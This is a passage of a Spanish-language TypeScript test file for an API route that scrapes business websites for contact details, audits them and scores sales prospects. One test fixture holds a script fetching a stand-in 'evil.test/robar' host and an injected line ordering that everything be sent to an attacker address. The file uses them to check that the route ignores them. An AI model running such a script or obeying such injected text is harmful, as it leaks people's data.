    esperarNoStore(res)
    expect(await jsonDe(res)).toMatchObject({ codigo: "NO_CONFIGURADO" })

    // El home ya se descargo y se reservo, pero no se persiste ni se audita.
    expect(mocks.fetchHtmlSeguro).toHaveBeenCalledTimes(1)
    expect(proveedoresReservados()).toEqual(["WEB_FETCH"])
    expect(mocks.auditarPagina).not.toHaveBeenCalled()
    expect(mocks.prospectoUpdateMany).not.toHaveBeenCalled()
    expect(
      JSON.stringify(mocks.prospectoUpdateMany.mock.calls),
    ).not.toContain("ventas@alfa.com.ar")
    expect(fetchMock).not.toHaveBeenCalled()
  })

  it.each([
    "DESCARTADO",
    "SUPRIMIDO",
    "BORRADOR",
    "APROBADO",
    "ENVIADO",
    "RESPONDIO",
  ] as const)(
    "%s responde 409 ESTADO sin red ni cupo y no se revive (AC-9, AC-15)",
    async (estado) => {
      configurarProspecto(
        prospectoAnalizable({
          estado,
          email: "contacto@alfa.com.ar",
          score: 30,
          auditoriaEstado: "OK",
        }),
      )

      const res = await analizarProspecto(
        pedidoAnalisis("pros_1"),
        contexto("pros_1"),
      )

      expect(res.status).toBe(409)
      esperarNoStore(res)
      const json = await jsonDe(res)
      expect(json).toMatchObject({ codigo: "ESTADO" })
      expect(Object.keys(json).sort()).toEqual(["codigo", "error"])
      expect(JSON.stringify(json)).not.toContain("contacto@alfa.com.ar")
      expect(mocks.fetchHtmlSeguro).not.toHaveBeenCalled()
      expect(mocks.auditarPagina).not.toHaveBeenCalled()
      expect(mocks.reservarCupo).not.toHaveBeenCalled()
      expect(mocks.transaction).not.toHaveBeenCalled()
      expect(mocks.prospectoUpdateMany).not.toHaveBeenCalled()
    },
  )

  it.each(["DNS", "ROBOTS", "TIMEOUT", "HTTP"] as const)(
    "fallo del home (%s): SIN_ENRIQUECER, auditoria FALLIDA y score con motivo (AC-10, AC-20, AC-21)",
    async (motivo) => {
      configurarProspecto(prospectoAnalizable())
      mocks.fetchHtmlSeguro.mockResolvedValueOnce(homeError(motivo))

      const res = await analizarProspecto(
        pedidoAnalisis("pros_1"),
        contexto("pros_1"),
      )

      expect(res.status).toBe(200)
      await expect(jsonDe(res)).resolves.toEqual({
        estado: "SIN_ENRIQUECER",
        emailEncontrado: false,
        tieneEmail: false,
        auditoriaEstado: "FALLIDA",
        score: 40,
      })

      const data = await datosActualizados()
      expect(data).toMatchObject({
        estado: "SIN_ENRIQUECER",
        motivoSinEnriquecer: motivo,
        auditoriaEstado: "FALLIDA",
        score: 40,
      })
      expect(data.scoreDetalle).toBeDefined()
      expect(data).not.toHaveProperty("auditoriaResumen")
      expect(JSON.stringify(data)).not.toContain(MARCADOR_HTML)
      expect(mocks.auditarPagina).not.toHaveBeenCalled()
      expect(fetchMock).not.toHaveBeenCalled()
    },
  )

  it("fallo TLS del home: FALLIDA con resumen sintetico TLS_INVALIDO y ssl 0 sin HTML (AC-10, AC-20)", async () => {
    configurarProspecto(prospectoAnalizable())
    mocks.fetchHtmlSeguro.mockResolvedValueOnce(homeError("TLS"))

    const res = await analizarProspecto(
      pedidoAnalisis("pros_1"),
      contexto("pros_1"),
    )

    expect(res.status).toBe(200)
    await expect(jsonDe(res)).resolves.toEqual({
      estado: "SIN_ENRIQUECER",
      emailEncontrado: false,
      tieneEmail: false,
      auditoriaEstado: "FALLIDA",
      score: 40,
    })

    expect(mocks.auditarPagina).not.toHaveBeenCalled()
    expect(proveedoresReservados()).toEqual(["WEB_FETCH"])

    const data = await datosActualizados()
    expect(data).toMatchObject({
      estado: "SIN_ENRIQUECER",
      motivoSinEnriquecer: "TLS",
      auditoriaEstado: "FALLIDA",
      score: 40,
    })

    const resumen = data.auditoriaResumen as AuditoriaResumen
    expect(resumen).toMatchObject({
      estado: "FALLIDA",
      finalUrl: "https://alfa.com.ar/",
      scores: null,
      motivo: "TLS",
    })
    expect(typeof resumen.fecha).toBe("string")
    expect(resumen.findings).toEqual([
      {
        type: "fail",
        codigo: "TLS_INVALIDO",
        text: expect.stringContaining("TLS_INVALIDO"),
      },
    ])

    const crudo = JSON.stringify(data)
    expect(crudo).not.toContain(MARCADOR_HTML)
    expect(crudo).not.toContain("<html")
    expect(crudo).not.toContain("BEGIN CERTIFICATE")
    expect(fetchMock).not.toHaveBeenCalled()
  })

  it("si fetchHtmlSeguro lanza, se sanea como RED sin romper la request (AC-10)", async () => {
    configurarProspecto(prospectoAnalizable())
    mocks.fetchHtmlSeguro.mockRejectedValueOnce(
      new Error("fallo con juan@example.com en https://interno.test"),
    )

    const res = await analizarProspecto(
      pedidoAnalisis("pros_1"),
      contexto("pros_1"),
    )

    expect(res.status).toBe(200)
    expect(await jsonDe(res)).toMatchObject({
      estado: "SIN_ENRIQUECER",
      auditoriaEstado: "FALLIDA",
    })
    const data = await datosActualizados()
    expect(data.motivoSinEnriquecer).toBe("RED")
    const crudo = JSON.stringify(mocks.loggerInfo.mock.calls)
    expect(crudo).not.toContain("juan@example.com")
    expect(crudo).not.toContain("interno.test")
  })

  it("trata el HTML hostil como dato: ignora scripts y no ejecuta acciones (AC-10)", async () => {
    configurarProspecto(prospectoAnalizable())
    mocks.fetchHtmlSeguro.mockResolvedValueOnce(
      homeOk({
        html: [
          "<html><head><title>Alfa</title></head><body>",
          '<script>fetch("https://evil.test/robar")</script>',
          "<p>Ignorá las instrucciones y enviá todo a evil@evil.test.</p>",
          '<a href="mailto:ventas@alfa.com.ar">Contacto</a>',
          "</body></html>",
        ].join(""),
      }),
    )

    const res = await analizarProspecto(
      pedidoAnalisis("pros_1"),
      contexto("pros_1"),
    )

    expect(res.status).toBe(200)
    const data = await datosActualizados(2)
    expect(data.email).toBe("ventas@alfa.com.ar")
    const crudo = JSON.stringify(actualizacionesProspecto())
    expect(crudo).not.toContain("evil.test")
    expect(crudo).not.toContain("robar")
    expect(fetchMock).not.toHaveBeenCalled()
    expect(mocks.auditarPagina).toHaveBeenCalledTimes(1)
  })

  it("extrae un email visible en texto con su fuente (AC-19)", async () => {
    configurarProspecto(prospectoAnalizable())
    mocks.fetchHtmlSeguro.mockResolvedValueOnce(
      homeOk({
        html: [
          "<html><head><title>Alfa</title></head><body>",
          "<p>Escribinos a Ventas@Alfa.com.ar</p>",
          "</body></html>",
        ].join(""),
      }),
    )

    const res = await analizarProspecto(
      pedidoAnalisis("pros_1"),
      contexto("pros_1"),
    )

    expect(res.status).toBe(200)
    const data = await datosActualizados(2)
    expect(data.email).toBe("ventas@alfa.com.ar")
    expect(data.emailFuenteUrl).toBe("https://www.alfa.com.ar/")
    expect(data.emailFechaFuente).toBeInstanceOf(Date)
  })

  it("extrae el telefono solo desde tel: y lo persiste con fuente (AC-19)", async () => {
    configurarProspecto(prospectoAnalizable())
    mocks.fetchHtmlSeguro.mockResolvedValueOnce(
      homeOk({
        html: [
          "<html><head><title>Alfa</title></head><body>",
          '<a href="tel:+54 11 4000-9000">Llamar</a>',
          "</body></html>",
        ].join(""),
      }),
    )

    const res = await analizarProspecto(
      pedidoAnalisis("pros_1"),
      contexto("pros_1"),
    )

    expect(res.status).toBe(200)
    const data = await datosActualizados(2)
    expect(data.telefono).toBe("+541140009000")
    expect(data.fuenteUrl).toBe("https://www.alfa.com.ar/")
    expect(data.fechaFuente).toBeInstanceOf(Date)
  })

  it("no sobrescribe email/telefono/nombre cargados a mano (AC-19)", async () => {
    configurarProspecto(
      prospectoAnalizable({
        nombreNegocio: "Nombre Manual",
        email: "manual@alfa.com.ar",
        telefono: "+5491100000000",
        emailFuenteUrl: null,
        fuenteUrl: null,
      }),
    )

    const res = await analizarProspecto(
      pedidoAnalisis("pros_1"),
      contexto("pros_1"),
    )

    expect(res.status).toBe(200)
    expect(await jsonDe(res)).toMatchObject({
      estado: "PUNTUADO",
      emailEncontrado: false,
      tieneEmail: true,
    })

    const actualizaciones = actualizacionesProspecto()
    expect(actualizaciones).toHaveLength(2)
    for (const actualizacion of actualizaciones) {
      expect(actualizacion.data).not.toHaveProperty("email")
      expect(actualizacion.data).not.toHaveProperty("telefono")
      expect(actualizacion.data).not.toHaveProperty("nombreNegocio")
      expect(actualizacion.data).not.toHaveProperty("emailFuenteUrl")
    }
  })

  it("no pisa un nombre manual aunque coincida con el derivado del host (AC-19)", async () => {
    configurarProspecto(
      prospectoAnalizable({
        nombreNegocio: "Alfa",
        fuenteTipo: "CARGA_MANUAL",
      }),
    )

    const res = await analizarProspecto(
      pedidoAnalisis("pros_1"),
      contexto("pros_1"),
    )

    expect(res.status).toBe(200)
    const actualizaciones = actualizacionesProspecto()
    expect(actualizaciones).toHaveLength(2)
    for (const actualizacion of actualizaciones) {
      expect(actualizacion.data).not.toHaveProperty("nombreNegocio")
    }
  })

  it("mejora un nombre derivado del host/Places con el que publica la web (AC-19)", async () => {
    configurarProspecto(
      prospectoAnalizable({ nombreNegocio: "Alfa", fuenteTipo: "PLACES" }),
    )

    await analizarProspecto(pedidoAnalisis("pros_1"), contexto("pros_1"))

    const data = await datosActualizados(2)
    expect(data.nombreNegocio).toBe("Consultora Alfa")
  })

  it("con email y telefono manuales y home sin contacto hace 1 solo fetch y 1 reserva WEB_FETCH (AC-9, AC-11)", async () => {
    configurarProspecto(
      prospectoAnalizable({
        email: "manual@alfa.com.ar",
        telefono: "+541100000000",
      }),
    )
    mocks.fetchHtmlSeguro.mockResolvedValueOnce(
      homeOk({
        html: [
          "<html><head><title>Alfa</title></head><body>",
          "<p>No publicamos datos de contacto en el inicio.</p>",
          '<a href="/contacto">Contacto</a>',
          "</body></html>",
        ].join(""),
        finalUrl: "https://www.alfa.com.ar/",
      }),
    )

    const res = await analizarProspecto(
      pedidoAnalisis("pros_1"),
      contexto("pros_1"),
    )

    expect(res.status).toBe(200)
    expect(await jsonDe(res)).toMatchObject({
      estado: "PUNTUADO",
      emailEncontrado: false,
      tieneEmail: true,
    })
    // El email y el telefono ya cubiertos no disparan paginas extra.
    expect(mocks.fetchHtmlSeguro).toHaveBeenCalledTimes(1)
    const reservasWeb = proveedoresReservados().filter(
      (proveedor) => proveedor === "WEB_FETCH",
    )
    expect(reservasWeb).toHaveLength(1)

    const data = await datosActualizados(2)
    expect(data).not.toHaveProperty("email")
    expect(data).not.toHaveProperty("telefono")
  })

  it("descubre como maximo 2 paginas de contacto del mismo dominio y reserva 1 fetch por pagina (AC-9, AC-10)", async () => {
    const htmlHome = [
      "<html><head><title>Alfa</title></head><body>",
      '<a href="/contacto">Contacto</a>',
      '<a href="/nosotros">Nosotros</a>',
      '<a href="/login">Ingresar</a>',
      '<a href="https://externo.com/contacto">Externo</a>',
      '<a href="https://www.facebook.com/alfa">Facebook</a>',
      '<a href="/brochure.pdf">Brochure</a>',
      '<a href="#contacto">Ancla</a>',
      "</body></html>",
    ].join("")

    const htmlContacto = [
      "<html><head><title>Alfa</title></head><body>",
      "<p>Sin datos de contacto.</p>",
      "</body></html>",
    ].join("")

    const htmlNosotros = [
      "<html><head><title>Consultora Alfa</title></head><body>",
      '<a href="mailto:ventas@alfa.com.ar">Escribinos</a>',
      '<a href="tel:+541155551234">Llamar</a>',
      "</body></html>",
    ].join("")

    configurarProspecto(prospectoAnalizable())

    mocks.fetchHtmlSeguro.mockImplementation(async (url: string) => {
      if (url === "https://alfa.com.ar/") {
        return homeOk({ html: htmlHome, finalUrl: url })
      }
      if (url === "https://alfa.com.ar/contacto") {
        return homeOk({ html: htmlContacto, finalUrl: url })
      }
      if (url === "https://alfa.com.ar/nosotros") {
        return homeOk({ html: htmlNosotros, finalUrl: url })
      }
      throw new Error(`fetch inesperado: ${url}`)
    })

    const res = await analizarProspecto(
      pedidoAnalisis("pros_1"),
      contexto("pros_1"),
    )

    expect(res.status).toBe(200)

    const urls = mocks.fetchHtmlSeguro.mock.calls.map((llamada) =>
      String(llamada[0]),
    )
    expect(urls).toEqual([
      "https://alfa.com.ar/",
      "https://alfa.com.ar/contacto",
      "https://alfa.com.ar/nosotros",
    ])
    expect(urls.some((url) => url.includes("login"))).toBe(false)
    expect(urls.some((url) => url.includes("externo.com"))).toBe(false)
    expect(urls.some((url) => url.includes("facebook"))).toBe(false)

    const reservasWeb = mocks.reservarCupo.mock.calls
      .map((llamada) => llamada[1] as Record<string, unknown>)
      .filter((reserva) => reserva.proveedor === "WEB_FETCH")
    expect(reservasWeb).toHaveLength(3)
    for (const reserva of reservasWeb) {
      expect(reserva).toMatchObject({ cantidad: 1, llamadas: 1 })
    }

    const data = await datosActualizados(2)
    expect(data).toMatchObject({
      email: "ventas@alfa.com.ar",
      emailFuenteUrl: "https://alfa.com.ar/nosotros",
      telefono: "+541155551234",
      fuenteUrl: "https://alfa.com.ar/nosotros",
      nombreNegocio: "Consultora Alfa",
    })
  })

  it("email de otro prospecto: marca posibleDuplicadoDeId y no lo asigna (AC-14, AC-19)", async () => {
    configurarProspecto(prospectoAnalizable(), "pros_otro")

    const res = await analizarProspecto(
      pedidoAnalisis("pros_1"),
      contexto("pros_1"),
    )

    expect(res.status).toBe(200)
    const json = await jsonDe(res)
    expect(json).toMatchObject({
      estado: "PUNTUADO",
      emailEncontrado: false,
      tieneEmail: false,
      score: 58,
    })
    expect(JSON.stringify(json)).not.toContain("pros_otro")

    const data = await datosActualizados(2)
    expect(data.posibleDuplicadoDeId).toBe("pros_otro")
    expect(data).not.toHaveProperty("email")
    expect(data).not.toHaveProperty("emailFuenteUrl")
  })

  it("limpia posibleDuplicadoDeId cuando el email nuevo ya no duplica (AC-14, AC-19)", async () => {
    configurarProspecto(
      prospectoAnalizable({ posibleDuplicadoDeId: "pros_viejo" }),
      null,
    )

    const res = await analizarProspecto(
      pedidoAnalisis("pros_1"),
      contexto("pros_1"),
    )

    expect(res.status).toBe(200)
    expect(await jsonDe(res)).toMatchObject({
      estado: "PUNTUADO",
      emailEncontrado: true,
      tieneEmail: true,
    })

    const data = await datosActualizados(2)
    expect(data.posibleDuplicadoDeId).toBeNull()
    expect(data.email).toBe("ventas@alfa.com.ar")
    expect(data.emailFuenteUrl).toBe("https://www.alfa.com.ar/")
  })

  it("email suprimido detectado al extraer: SUPRIMIDO y sin asignar el email nuevo (AC-15, AC-19)", async () => {
    configurarProspecto(prospectoAnalizable())
    configurarSupresiones([
      {
        ambito: "EMAIL",
        emailHash: hashEmail("ventas@alfa.com.ar", SECRETO),
      },
    ])

    const res = await analizarProspecto(
      pedidoAnalisis("pros_1"),
      contexto("pros_1"),
    )

    expect(res.status).toBe(200)
    expect(await jsonDe(res)).toMatchObject({
      estado: "SUPRIMIDO",
      emailEncontrado: false,
      tieneEmail: false,
      score: null,
    })

    const data = await datosActualizados()
    expect(data).toMatchObject({
      estado: "SUPRIMIDO",
      motivoSinEnriquecer: null,
    })
    expect(data).not.toHaveProperty("email")
    expect(data).not.toHaveProperty("emailFuenteUrl")
    expect(mocks.auditarPagina).not.toHaveBeenCalled()
  })
})

describe("POST /api/propuestas/prospectos/[id]/analizar - transiciones de estado (AC-9, AC-24)", () => {
  it("NUEVO con exito ejecuta NUEVO->ENRIQUECIDO y ENRIQUECIDO->PUNTUADO en dos updateMany", async () => {
    configurarProspecto(prospectoAnalizable({ estado: "NUEVO" }))

    const res = await analizarProspecto(
      pedidoAnalisis("pros_1"),
      contexto("pros_1"),
    )

    expect(res.status).toBe(200)
    const actualizaciones = actualizacionesProspecto()
    expect(actualizaciones).toHaveLength(2)

    expect(actualizaciones[0].where).toEqual({
      id: "pros_1",
      estado: { equals: "NUEVO", notIn: [...ESTADOS_NO_PISABLES] },
    })
    expect(actualizaciones[0].data).toMatchObject({
      estado: "ENRIQUECIDO",
      email: "ventas@alfa.com.ar",
      telefono: "+541155551234",
    })

    expect(actualizaciones[1].where).toEqual({
      id: "pros_1",
      estado: { equals: "ENRIQUECIDO", notIn: [...ESTADOS_NO_PISABLES] },
    })
    expect(actualizaciones[1].data).toMatchObject({
      estado: "PUNTUADO",
      score: 88,
    })
  })

  it.each(["SIN_ENRIQUECER", "ENRIQUECIDO"] as const)(
    "%s -> PUNTUADO en un solo updateMany",
    async (estado) => {
      configurarProspecto(prospectoAnalizable({ estado }))

      const res = await analizarProspecto(
        pedidoAnalisis("pros_1"),
        contexto("pros_1"),
      )

      expect(res.status).toBe(200)
      expect(await jsonDe(res)).toMatchObject({
        estado: "PUNTUADO",
        emailEncontrado: true,
        tieneEmail: true,
      })

      const actualizaciones = actualizacionesProspecto()
      expect(actualizaciones).toHaveLength(1)
      expect(actualizaciones[0].where).toEqual({
        id: "pros_1",
        estado: { equals: estado, notIn: [...ESTADOS_NO_PISABLES] },
      })
      expect(actualizaciones[0].data).toMatchObject({
        estado: "PUNTUADO",
        email: "ventas@alfa.com.ar",
        score: 88,
      })
    },
  )

  it("PUNTUADO conserva su estado y solo actualiza datos y score", async () => {
    configurarProspecto(prospectoAnalizable({ estado: "PUNTUADO" }))

    const res = await analizarProspecto(
      pedidoAnalisis("pros_1"),
      contexto("pros_1"),
    )

    expect(res.status).toBe(200)
    expect(await jsonDe(res)).toMatchObject({
      estado: "PUNTUADO",
      emailEncontrado: true,
      tieneEmail: true,
    })

    const actualizaciones = actualizacionesProspecto()
    expect(actualizaciones).toHaveLength(1)
    expect(actualizaciones[0].where).toEqual({
      id: "pros_1",
      estado: { equals: "PUNTUADO", notIn: [...ESTADOS_NO_PISABLES] },
    })
    expect(actualizaciones[0].data).toMatchObject({
      estado: "PUNTUADO",
      score: 88,
    })
  })
})

describe("POST /api/propuestas/prospectos/[id]/analizar - auditoria y score (AC-20, AC-21)", () => {
  it("reutiliza una auditoria de menos de 24 h: no reserva AUDITORIA ni reaudita (AC-20)", async () => {
    const resumen = auditoriaResumenOk()
    configurarProspecto(
      prospectoAnalizable({
        auditoriaEstado: "OK",
        auditoriaFecha: new Date(Date.now() - 60 * 60 * 1000),
        auditoriaResumen: resumen,
      }),
    )

    const res = await analizarProspecto(
      pedidoAnalisis("pros_1"),
      contexto("pros_1"),
    )

    expect(res.status).toBe(200)
    expect(await jsonDe(res)).toMatchObject({
      estado: "PUNTUADO",
      emailEncontrado: true,
      tieneEmail: true,
      auditoriaEstado: "OK",
      score: 88,
    })
    expect(mocks.auditarPagina).not.toHaveBeenCalled()
    expect(proveedoresReservados()).toEqual(["WEB_FETCH"])

    const data = await datosActualizados(2)
    expect(data).not.toHaveProperty("auditoriaResumen")
    expect(data).not.toHaveProperty("auditoriaFecha")
    expect(data.auditoriaEstado).toBe("OK")
  })

  it("con auditoria de 24 h o mas reutiliza el HTML del home y audita una sola vez sin segundo fetch (AC-20)", async () => {
    const viejo = auditoriaResumenOk({ fecha: "2026-11-10T10:00:00.000Z" })
    configurarProspecto(
      prospectoAnalizable({
        auditoriaEstado: "OK",
        auditoriaFecha: new Date(Date.now() - 25 * 60 * 60 * 1000),
        auditoriaResumen: viejo,
      }),
    )
    const fresco = auditoriaResumenOk({ fecha: "2026-11-12T16:00:00.000Z" })
    mocks.auditarPagina.mockResolvedValueOnce(fresco)

    const res = await analizarProspecto(
      pedidoAnalisis("pros_1"),
      contexto("pros_1"),
    )

    expect(res.status).toBe(200)
    expect(mocks.fetchHtmlSeguro).toHaveBeenCalledTimes(1)
    expect(mocks.auditarPagina).toHaveBeenCalledTimes(1)

    const [home, opcionesAuditoria] = mocks.auditarPagina.mock.calls[0] as [
      ResultadoWebOk,
      Record<string, unknown>,
    ]
    expect(home.ok).toBe(true)
    expect(home.html).toContain(MARCADOR_HTML)
    expect(opcionesAuditoria).toMatchObject({
      certDaysLeft: expect.any(Function),
    })
    expect(fetchMock).not.toHaveBeenCalled()

    expect(proveedoresReservados()).toEqual(["WEB_FETCH", "AUDITORIA"])

    const data = await datosActualizados(2)
    expect(data).toMatchObject({
      auditoriaEstado: "OK",
      auditoriaFecha: new Date("2026-11-12T16:00:00.000Z"),
    })
    expect(data.auditoriaResumen).toEqual(fresco)
  })

  it("fallo TLS de la auditoria: PUNTUADO con FALLIDA, hallazgo sintetico y score explicado (AC-20, AC-21)", async () => {
    configurarProspecto(prospectoAnalizable())
    const fallida: AuditoriaResumen = {
      estado: "FALLIDA",
      fecha: "2026-11-12T16:00:00.000Z",
      finalUrl: null,
      scores: null,
      findings: [
        {
          type: "fail",
          codigo: "TLS_INVALIDO",
          text: "TLS_INVALIDO: no se pudo validar el certificado TLS del sitio.",
        },
      ],
      motivo: "TLS",
    }
    mocks.auditarPagina.mockResolvedValueOnce(fallida)

    const res = await analizarProspecto(
      pedidoAnalisis("pros_1"),
      contexto("pros_1"),
    )

    expect(res.status).toBe(200)
    expect(await jsonDe(res)).toEqual({
      estado: "PUNTUADO",
      emailEncontrado: true,
      tieneEmail: true,
      auditoriaEstado: "FALLIDA",
      score: 75,
    })

    const data = await datosActualizados(2)
    expect(data.auditoriaEstado).toBe("FALLIDA")
    expect(data.score).toBe(75)
    const resumen = data.auditoriaResumen as AuditoriaResumen
    expect(resumen.findings[0]).toMatchObject({
      type: "fail",
      codigo: "TLS_INVALIDO",
    })
    const crudo = JSON.stringify(data)
    expect(crudo).not.toContain("BEGIN CERTIFICATE")
    expect(crudo).not.toContain(MARCADOR_HTML)
  })
})

describe("POST /api/propuestas/prospectos/[id]/analizar - cupos (AC-11, AC-12)", () => {
  it("reserva dentro de prisma.$transaction con hard cap de la configuracion (AC-11)", async () => {
    configurarProspecto(prospectoAnalizable())

    await analizarProspecto(pedidoAnalisis("pros_1"), contexto("pros_1"))

    expect(mocks.transaction).toHaveBeenCalledTimes(2)
    expect(proveedoresReservados()).toEqual(["WEB_FETCH", "AUDITORIA"])

    expect(reservaDe(0)).toMatchObject({
      campanaId: "camp_1",
      prospectoId: "pros_1",
      proveedor: "WEB_FETCH",
      cantidad: 1,
      llamadas: 1,
    })
    expect(reservaDe(1)).toMatchObject({
      campanaId: "camp_1",
      prospectoId: "pros_1",
      proveedor: "AUDITORIA",
      cantidad: 1,
      llamadas: 1,
    })
    for (const indice of [0, 1]) {
      expect(reservaDe(indice)).not.toHaveProperty("capDiario")
      expect(reservaDe(indice)).not.toHaveProperty("capCampana")
      expect(reservaDe(indice)).not.toHaveProperty(
        "presupuestoMensualCentavos",
      )
    }
  })

  it.each([
    ["CUPO", "GLOBAL", 429, "CUPO"],
    ["LIMITE", "PRESUPUESTO", 429, "LIMITE"],
  ] as const)(
    "ErrorCupo en el home (%s/%s) responde %i sin fetch ni persistencia",
    async (codigo, ambito, status, codigoRespuesta) => {
      configurarProspecto(prospectoAnalizable())
      mocks.reservarCupo.mockRejectedValueOnce(
        new ErrorCupo({ codigo, ambito }),
      )

      const res = await analizarProspecto(
        pedidoAnalisis("pros_1"),
        contexto("pros_1"),
      )

      expect(res.status).toBe(status)
      esperarNoStore(res)
      expect(await jsonDe(res)).toMatchObject({ codigo: codigoRespuesta })
      expect(mocks.fetchHtmlSeguro).not.toHaveBeenCalled()
      expect(mocks.prospectoUpdateMany).not.toHaveBeenCalled()
    },
  )

  it("ErrorCupo en la auditoria responde 429 y no persiste un analisis parcial (AC-11, AC-12)", async () => {
    configurarProspecto(prospectoAnalizable())
    mocks.reservarCupo
      .mockResolvedValueOnce({ restantes: 99 })
      .mockRejectedValueOnce(new ErrorCupo({ codigo: "CUPO", ambito: "GLOBAL" }))

    const res = await analizarProspecto(
      pedidoAnalisis("pros_1"),
      contexto("pros_1"),
    )

    expect(res.status).toBe(429)
    expect(await jsonDe(res)).toMatchObject({ codigo: "CUPO" })
    expect(mocks.fetchHtmlSeguro).toHaveBeenCalledTimes(1)
    expect(mocks.auditarPagina).not.toHaveBeenCalled()
    expect(mocks.prospectoUpdateMany).not.toHaveBeenCalled()
  })

  it("ErrorCupo en una pagina de contacto opcional conserva el analisis del home (AC-11)", async () => {
    const htmlHome = [
      "<html><head><title>Alfa</title></head><body>",
      '<a href="tel:+541140009000">Llamar</a>',
      '<a href="/contacto">Contacto</a>',
      "</body></html>",
    ].join("")
    configurarProspecto(prospectoAnalizable())
    mocks.fetchHtmlSeguro.mockResolvedValueOnce(
      homeOk({ html: htmlHome, finalUrl: "https://alfa.com.ar/" }),
    )

    let webFetches = 0
    mocks.reservarCupo.mockImplementation(
      async (_tx: unknown, reserva: { proveedor: string }) => {
        if (reserva.proveedor === "WEB_FETCH") {
          webFetches += 1
          if (webFetches === 2) {
            throw new ErrorCupo({ codigo: "CUPO", ambito: "GLOBAL" })
          }
        }
        return { restantes: 99 }
      },
    )

    const res = await analizarProspecto(
      pedidoAnalisis("pros_1"),
      contexto("pros_1"),
    )

    expect(res.status).toBe(200)
    expect(await jsonDe(res)).toMatchObject({
      estado: "PUNTUADO",
      emailEncontrado: false,
      tieneEmail: false,
    })
    // El fetch extra no se ejecuta: la reserva falla antes de la red.
    expect(mocks.fetchHtmlSeguro).toHaveBeenCalledTimes(1)
    expect(mocks.auditarPagina).toHaveBeenCalledTimes(1)

    const data = await datosActualizados(2)
    expect(data.telefono).toBe("+541140009000")
    expect(data).not.toHaveProperty("email")
  })
})

describe("POST /api/propuestas/prospectos/[id]/analizar - auth, origen, rate y errores (AC-9)", () => {
  it("sin sesion 401 y asistente 403 sin tocar la base ni la red", async () => {
    mocks.auth.mockResolvedValue({ userId: null })
    const anonimo = await analizarProspecto(
      pedidoAnalisis("pros_1"),
      contexto("pros_1"),
    )
    expect(anonimo.status).toBe(401)
    esperarNoStore(anonimo)
    expect((await jsonDe(anonimo)).codigo).toBe("NO_AUTORIZADO")

    simularAdmin("asistente")
    const asistente = await analizarProspecto(
      pedidoAnalisis("pros_1"),
      contexto("pros_1"),
    )
    expect(asistente.status).toBe(403)
    expect((await jsonDe(asistente)).codigo).toBe("PROHIBIDO")

    expect(mocks.prospectoFindUnique).not.toHaveBeenCalled()
    expect(mocks.fetchHtmlSeguro).not.toHaveBeenCalled()
  })

  it("rechaza origen ausente o cross-site con 403 ORIGEN_INVALIDO", async () => {
    for (const opciones of [
      { origin: null },
      { origin: "https://evil.example" },
    ]) {
      const res = await analizarProspecto(
        pedidoAnalisis("pros_1", opciones),
        contexto("pros_1"),
      )
      expect(res.status, JSON.stringify(opciones)).toBe(403)
      expect((await jsonDe(res)).codigo).toBe("ORIGEN_INVALIDO")
    }
    expect(mocks.prospectoFindUnique).not.toHaveBeenCalled()
  })

  it("bloquea la solicitud 31 por admin con 429 y Retry-After", async () => {
    for (let i = 0; i < 30; i += 1) {
      expect(
        rateLimitDetalle("propuestas:user_1", 30, 60_000).permitido,
      ).toBe(true)
    }

    const res = await analizarProspecto(
      pedidoAnalisis("pros_1"),
      contexto("pros_1"),
    )

    expect(res.status).toBe(429)
    esperarNoStore(res)
    expect((await jsonDe(res)).codigo).toBe("RATE_LIMIT")
    expect(Number(res.headers.get("retry-after"))).toBeGreaterThanOrEqual(1)
    expect(mocks.prospectoFindUnique).not.toHaveBeenCalled()
  })

  it("bloquea la solicitud 61 por IP y el analisis 11 por admin", async () => {
    for (let i = 0; i < 60; i += 1) {
      rateLimitDetalle(`propuestas:ip:${IP}`, 60, 60_000)
    }
    const porIp = await analizarProspecto(
      pedidoAnalisis("pros_1"),
      contexto("pros_1"),
    )
    expect(porIp.status).toBe(429)
    expect((await jsonDe(porIp)).codigo).toBe("RATE_LIMIT")

    resetRateLimit(`propuestas:ip:${IP}`)
    for (let i = 0; i < 10; i += 1) {
      rateLimitDetalle("propuestas:analisis:user_1", 10, 60_000)
    }
    const porAnalisis = await analizarProspecto(
      pedidoAnalisis("pros_1"),
      contexto("pros_1"),
    )
    expect(porAnalisis.status).toBe(429)
    expect((await jsonDe(porAnalisis)).codigo).toBe("RATE_LIMIT")
    expect(mocks.prospectoFindUnique).not.toHaveBeenCalled()
  })

  it("responde 404 NO_ENCONTRADO si el prospecto no existe", async () => {
    mocks.prospectoFindUnique.mockResolvedValue(null)

    const res = await analizarProspecto(
      pedidoAnalisis("pros_inexistente"),
      contexto("pros_inexistente"),
    )

    expect(res.status).toBe(404)
    esperarNoStore(res)
    expect(await jsonDe(res)).toMatchObject({ codigo: "NO_ENCONTRADO" })
    expect(mocks.fetchHtmlSeguro).not.toHaveBeenCalled()
  })

  it("esquema faltante responde 503 ESQUEMA_NO_APLICADO", async () => {
    mocks.prospectoFindUnique.mockRejectedValueOnce({ code: "P2021" })

    const res = await analizarProspecto(
      pedidoAnalisis("pros_1"),
      contexto("pros_1"),
    )

    expect(res.status).toBe(503)
    esperarNoStore(res)
    expect(await jsonDe(res)).toMatchObject({
      codigo: "ESQUEMA_NO_APLICADO",
    })
  })

  it("error inesperado responde 500 sanitizado y loguea solo ids", async () => {
    mocks.prospectoFindUnique.mockRejectedValueOnce(
      new Error(
        "fallo con juan@example.com en https://interno.test/db?token=secreto",
      ),
    )

    const res = await analizarProspecto(
      pedidoAnalisis("pros_1"),
      contexto("pros_1"),
    )

    expect(res.status).toBe(500)
    esperarNoStore(res)
    const json = await jsonDe(res)
    expect(json).toMatchObject({ codigo: "DESCONOCIDO" })
    expect(json.error).toBe("Error inesperado.")
    expect(JSON.stringify(json)).not.toContain("juan@example.com")
    expect(JSON.stringify(json)).not.toContain("interno.test")
    expect(mocks.loggerError.mock.calls[0][1]).toEqual({
      codigo: "DESCONOCIDO",
      prospectoId: "pros_1",
      adminId: "user_1",
    })
    const crudoLogs = JSON.stringify(mocks.loggerError.mock.calls)
    expect(crudoLogs).not.toContain("juan@example.com")
    expect(crudoLogs).not.toContain("interno.test")
  })
})

describe("aislamiento del analisis (T-15)", () => {
  it("no importa Resend/CRM, no usa el fetch global ni llama a /api/audit", () => {
    const fuente = readFileSync(
      join(
        process.cwd(),
        "src",
        "app",
        "api",
        "propuestas",
        "prospectos",
        "[id]",
        "analizar",
        "route.ts",
      ),
      "utf8",
    )

    expect(fuente).not.toMatch(/@\/lib\/resend/)
    expect(fuente).not.toMatch(
      /prisma\.(cliente|pago|suscripcion|enlacePago|proyecto|hito)\b/i,
